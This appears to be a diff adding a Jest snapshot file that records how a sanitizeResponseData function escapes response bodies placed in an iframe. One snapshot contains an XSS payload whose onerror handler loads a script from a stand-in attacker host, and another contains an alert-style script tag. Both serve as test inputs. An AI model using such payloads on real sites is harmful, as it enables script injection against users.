@@ -1,0 +1,33 @@
+// Jest Snapshot v1, https://goo.gl/fbAQLP
+
+exports[`sanitizeResponseData wraps the response body in an iframe 1`] = `
+"
+		<iframe srcdoc='https://example.com'
+			style="position:fixed; top:0; left:0; width:100vw; height:100vh; border:none; overflow:auto;"
+			allowtransparency="true">
+		</iframe>"
+`;
+
+exports[`sanitizeResponseData wraps the response body in an iframe 2`] = `
+"
+		<iframe srcdoc='<source onerror="s=document.createElement(&#39;script&#39;);s.srcdoc=&#39;http://attacker.com/evil.js&#39;;document.body.appendChild(s);">'
+			style="position:fixed; top:0; left:0; width:100vw; height:100vh; border:none; overflow:auto;"
+			allowtransparency="true">
+		</iframe>"
+`;
+
+exports[`sanitizeResponseData wraps the response body in an iframe 3`] = `
+"
+		<iframe srcdoc='<div>Test with  &#39;single quote&#39;</div>'
+			style="position:fixed; top:0; left:0; width:100vw; height:100vh; border:none; overflow:auto;"
+			allowtransparency="true">
+		</iframe>"
+`;
+
+exports[`sanitizeResponseData wraps the response body in an iframe 4`] = `
+"
+		<iframe srcdoc='John&#39;s company "TechCorp & Associates" announced: &#39;We&#39;re launching a revolutionary product at €1,299.99 — it&#39;s 50% faster than competitors!&#39; The CEO said, "This isn&#39;t just an upgrade; it&#39;s a complete transformation." Users praised the app&#39;s ability to handle complex data like <script>alert(&#39;XSS&#39;)</script> and symbols such as @, #, $, %, ^, &, *, (, ), [, ], {, }, |, , /, ?, <, >, ~, \`, +, =, -, _, and even emojis like 🚀 & 💡. The product description reads: "It supports UTF-8 encoding, handles apostrophes in names like O&#39;Connor & D&#39;Angelo, processes mathematical expressions like 2 < 5 > 1, and manages URLs such as https://example.com/path?param=value&other=&#39;test&#39;. We&#39;ve tested it with HTML entities like &amp;, &lt;, &gt;, &quot;, &#39;, and even complex strings like \`console.log("Hello &#39;World&#39;!");\`" — truly impressive!'
+			style="position:fixed; top:0; left:0; width:100vw; height:100vh; border:none; overflow:auto;"
+			allowtransparency="true">
+		</iframe>"
+`;
